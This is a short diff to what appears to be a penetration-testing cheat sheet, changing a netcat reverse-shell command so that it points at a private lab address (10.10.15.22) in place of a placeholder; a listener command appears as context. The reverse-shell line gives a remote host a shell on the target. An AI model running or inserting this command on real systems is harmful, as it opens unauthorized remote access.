@@ -50,7 +50,7 @@ nc -lnvp 4000
 
 ### Set Reverse Shell on Target
 ```bash
-nc -e /bin/sh IP.OF.LISTENER 4000
+nc -e /bin/sh 10.10.15.22 4000
 ```
 ## Usefuls Scripts
 ### HEX Converter
